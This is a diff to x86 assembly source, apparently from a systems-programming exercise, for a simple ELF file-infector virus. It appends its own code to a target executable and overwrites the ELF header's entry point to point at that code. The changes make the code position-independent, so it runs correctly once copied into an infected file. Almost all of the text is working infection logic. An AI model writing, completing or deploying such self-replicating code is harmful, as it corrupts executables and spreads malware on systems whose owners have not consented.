@@ -63,8 +63,12 @@ _start:
 	mov	ebp, esp
 	sub	esp, STK_RES            ; Set up ebp and reserve space on the stack for local storage
 
-	write 1, OutStr, 32					; print virus
+	; write 1, OutStr, 32					; print virus
 
+	call get_my_loc
+	sub ecx, next_i
+	add  ecx, OutStr
+	write 1, ecx, 32
 
     mov ebx, FileName           ; Set filename
     open ebx,RDWR, 0x777
@@ -83,23 +87,28 @@ _start:
     lseek FD, 0 ,SEEK_END 				;set the file pointer to the end of the file
     mov FIleSize, eax
     call get_my_loc
-    mov ecx, _start
+	sub ecx, next_i
+    add ecx, _start
     mov edx , virus_end-_start
     write FD,ecx,edx					;write the content of this script to the end of the file
 
-    lseek FD, 0 ,SEEK_SET				
-	mov eax, 0x8048000
+	mov eax, 0x8048000					; ELF base address
 	add eax, FIleSize
 	mov dword [ELF_header+ENTRY], eax
-	lea ecx, [ELF_header]
-	write FD,ecx,52	
+	lseek FD, 0, SEEK_SET 				
+
+	lea ecx, [ELF_header]				;store the memory offset
+	write FD,ecx,52						;write the modified header back to the file
 
     call VirusExit
 	
 
 Not_Elf:
     close FD
-    write 1, Failstr, 11
+	call get_my_loc
+	sub ecx, next_i
+	add ecx, Failstr
+    write 1, ecx, 11
     exit 0
 
 
